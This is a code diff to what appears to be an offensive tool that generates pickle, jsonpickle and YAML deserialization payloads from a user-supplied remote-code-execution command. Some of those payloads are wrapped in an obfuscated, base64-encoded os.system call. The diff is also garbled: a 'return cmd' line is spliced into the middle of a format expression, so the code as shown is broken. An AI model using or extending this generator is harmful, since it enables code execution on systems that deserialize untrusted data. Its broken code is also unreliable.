@@ -8,6 +8,7 @@ from base64 import b64encode, b64decode
 import jsonpickle
 import yaml
 import subprocess
+from copy import deepcopy
 
 
 class Gen(object):
@@ -30,8 +31,7 @@ class Payload(object):
         self.quotes = True if "\'" in self.cmd or "\"" in self.cmd else False
 
     def pick(self):
-        self.case()
-        self.payload = pickle.dumps(Gen(tuple(self.cmd.split(" "))))
+        self.payload = pickle.dumps(Gen(tuple(self.case().split(" "))))
         self.payload = self.verifyencoding()
         self.savingfile("_pick")
 
@@ -47,8 +47,7 @@ class Payload(object):
         self.savingfile("_yaml")
 
     def js(self):
-        self.case()
-        self.payload = bytes(jsonpickle.encode(Gen(tuple(self.cmd.split(" ")))),
+        self.payload = bytes(jsonpickle.encode(Gen(tuple(self.case().split(" ")))),
                              'utf-8')
         self.payload = self.verifyencoding()
         self.savingfile("_jspick")
@@ -67,13 +66,13 @@ class Payload(object):
         return d
 
     def case(self):
+        cmd = deepcopy(self.cmd)
         if self.quotes:
-            self.cmd = self.prefix+"python -c exec({})".format(self.chr_encode("__import__('os').system"
+            cmd = self.prefix+"python -c exec({})".format(self.chr_encode("__import__('os').system"
                                                                                "(__import__('base64').b64decode({})"
-                                                                               ".decode('utf-8'))".
+        return cmd                                                                       ".decode('utf-8'))".
                                                                                format(b64encode(bytes(self.cmd, 'utf-8')
                                                                                                 ))))
-
 
 if __name__ == "__main__":
     cmd = input("Enter RCE command :")
